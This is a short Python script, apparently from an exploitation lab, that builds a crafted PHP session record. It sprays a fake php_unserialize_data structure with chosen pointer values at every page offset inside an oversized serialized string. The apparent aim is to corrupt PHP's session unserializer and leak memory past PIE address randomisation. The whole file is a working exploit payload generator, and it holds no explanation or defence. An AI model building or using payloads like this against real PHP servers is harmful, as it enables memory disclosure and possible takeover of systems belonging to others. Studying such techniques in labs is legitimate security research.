#!/usr/bin/env python3
"""PIE-lab session record builder with page-replicated fake php_unserialize_data.

Usage: mkleakpie.py OUT TOTAL USED P [PREFIX_SPEC ...]
Prefix specs: 'S:STR:83:32' 'J:LONG:4096'
The fake P is replicated at every file offset (k*0x1000 - 24) so it lands on P
for any page-aligned record buffer X.
"""
import struct, sys

def rec(name, val):
    nb = name.encode(); assert 1 <= len(nb) <= 127
    return bytes([len(nb)]) + nb + val

def strval(s): return b's:%d:"' % len(s) + s + b'";'
def longval(n): return b'i:%d;' % n

def build(total, used, P, specs):
    B0 = P + 0x80
    prefix = b''
    for sp in specs:
        p = sp.split(':')
        if p[1] == 'STR': prefix += rec(p[0], strval(bytes([int(p[2])])*int(p[3])))
        elif p[1] == 'LONG': prefix += rec(p[0], longval(int(p[2])))
        else: raise SystemExit('bad spec')
    L = total - len(prefix) - len(rec('K', b's:')) - 2 - 1
    for _ in range(10):
        h = rec('K', b's:%d:"' % L)
        nl = total - len(prefix) - len(h) - 2
        if nl == L: break
        L = nl
    h = rec('K', b's:%d:"' % L)
    payload_start = len(prefix) + len(h)
    payload = bytearray(b'A' * L)
    # replicate fake P at every page offset
    nrep = 0
    for k in range(1, total // 0x1000 + 2):
        off = k*0x1000 - 24
        b = off - payload_start
        if b < 0 or b + 0x98 > L: continue
        q = [P+56, B0, B0, 0, 0, 0, 0x7fffffff, 0, 0]
        for i, v in enumerate(q):
            payload[b+i*8:b+i*8+8] = struct.pack('<Q', v & 0xffffffffffffffff)
        payload[b+0x80:b+0x88] = struct.pack('<q', used)
        payload[b+0x88:b+0x90] = struct.pack('<Q', 0)
        nrep += 1
    data = prefix + h + bytes(payload) + b'";'
    assert len(data) == total, (len(data), total)
    return data, nrep, len(prefix), len(h)

if __name__ == '__main__':
    out = sys.argv[1]; total = int(sys.argv[2],0); used = int(sys.argv[3],0); P = int(sys.argv[4],0)
    data, nrep, pl, hl = build(total, used, P, sys.argv[5:])
    open(out,'wb').write(data)
    print('wrote %s total=%d used=%d P=%#x reps=%d prefix=%d khdr=%d' % (out,total,used,P,nrep,pl,hl))
